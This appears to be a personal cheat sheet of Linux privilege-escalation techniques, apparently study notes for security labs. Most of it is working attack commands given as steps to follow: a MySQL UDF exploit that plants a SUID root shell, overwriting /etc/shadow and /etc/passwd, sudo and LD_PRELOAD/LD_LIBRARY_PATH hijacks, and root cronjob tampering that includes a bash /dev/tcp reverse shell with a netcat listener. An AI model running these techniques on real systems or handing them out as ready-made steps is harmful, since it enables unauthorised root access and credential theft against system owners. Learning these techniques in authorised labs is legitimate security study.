# Linux priv esculation

## MySQL exploit

This exploit works if MySQL is run in root mode.

Using this exploit (https://www.exploit-db.com/exploits/1518)

Complie the code using gcc:

~~~ 
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
~~~

Open MySQL and create a user defined function that runs system commands.

This creates a SUID in the tmp that when run esculates priviledge. 

~~~
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
~~~
 
## Readable /etc/shadow

Readable /etc/shadowcan copied and cracked by john

## Writeable /etc/shadow

Generate a new password and replace the root password

~~~
mkpasswd -m sha-512 <password here>

Put :7::: at the end
~~~

## Writable /etc/passwd file

Generate a new password hash:

~~~
openssl passwd <newpassword>
~~~

Then in the /etc/passwd file change root password hash (it will be an x).


## Sudo escape sequencies.

~~~
sudo -l 
~~~

Then use GTFOBins (https://gtfobins.github.io) to look for sudo privesc.

If apache2 can be used in sudo then run:

~~~
sudo apache2 -f /etc/shadow
~~~

This gives the password sha-512 for root.

## sudo enviornmental variables.

Sudo can be configured to inherit environment variables from the user's environment.

~~~
sudo -l
--------------------------------------------------------------
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
--------------------------------------------------------------
~~~

- LD_PRELOAD is an enviornmental variable that loads a shared object before anything else.
- LD_LIBRARY_PATH is an enviornmental variable that a provides a lists of dirs where shared librarys 
  are searched for.

### Abusing sudo enviornmental varaiables
 
Create a shared object (one that will spawn a root shell).

~~~
gcc -fPIC -shared -nostartfiles -o /tmp/exploit_file.so exploit_file.c
~~~

Change the LD_PRELOAD to the file while running a programme in sudo.

~~~
sudo LD_PRELOAD=/tmp/preload.so <programme>
~~~

This will then run the shared object.

**OR**

Use a shared sudo enviornment (LD_LIBRARY_PATH)

Find shared library for a programme

~~~
ldd /usr/sbin/apache2
~~~

Create a shared object (that gives root access).

~~~
gcc -o /tmp/exploit_file.so -shared -fPIC exploit_file.c
~~~

Then run the programme

~~~
sudo LD_LIBRARY_PATH=/tmp apache2
~~~

https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/

## CronJobs File permission

Change a cronjob that is running by root user to gain a shell.

First view cronjobs
~~~
cat /etc/crontab
~~~

Then check if any are writeable

~~~
ls -l (cronjob from etc/crontab list)
~~~

Replace content of one of them with reverse shell

~~~
#!/bin/bash
bash -i >& /dev/tcp/<ip address of host machine>/4444 0>&1
~~~

Have a netcat listener 

~~~
nc -lvnp 4444
~~~

and a root shell should spawn!!

## Cronjob Enivornmental Variables

Can change a script (run by root) using cronjob to activate another script giving us root access.

Example

In this example the path variable leads to /home/user. We can exploit this by putting a script
here so it is excuted before the cronjob looks further for the actual script.

~~~
cronjob is overwrite.sh

vi ~/home/user/overwrite.sh

#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash

chmod +x /home/user/overwrite.sh

/tmp/rootbash -p
~~~

## Cronjobs wildcards.


